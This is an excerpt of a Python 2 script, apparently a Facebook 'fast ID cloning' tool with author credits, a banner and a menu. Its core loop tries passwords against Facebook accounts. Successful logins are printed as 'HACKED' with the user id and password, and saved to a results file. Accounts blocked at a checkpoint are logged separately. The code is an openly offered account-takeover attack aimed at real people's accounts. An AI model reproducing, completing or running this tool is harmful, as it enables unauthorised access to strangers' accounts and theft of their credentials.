...
print 'this tool is free by Flame Naim'
print 
psb('\x1b[1;32mYOU ENTERING BD SUPER FAST FB ID CLONING TOOL PLEASE WAIT......THIS TOOL MAKE BY FLAME NAIM......ANY ONE COPY THIS CODE! CREDIT ME ........ FLAME-NAIM.....................................OPENING.............')
for n in range(9999):
...
def menu():
    ...
    print 50 * '-'
    print 'Codder.  : FLAME NAIM'
    print 'AUTHOR   : MOHAMMED NAIM'
    print 'FACEBOOK : https://www.facebook.com/Naim.Vau80'
    print 'GITHUB   : https://github.com/Naim75o'
    print ''
    print 50 * '-'
    print '[1]  \x1b[1;96mGP'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[FLAME-NAIM-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[FLAME-NAIM-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[(FLAME-NAIM)Open After 03 Days]\x1b[0m \n'
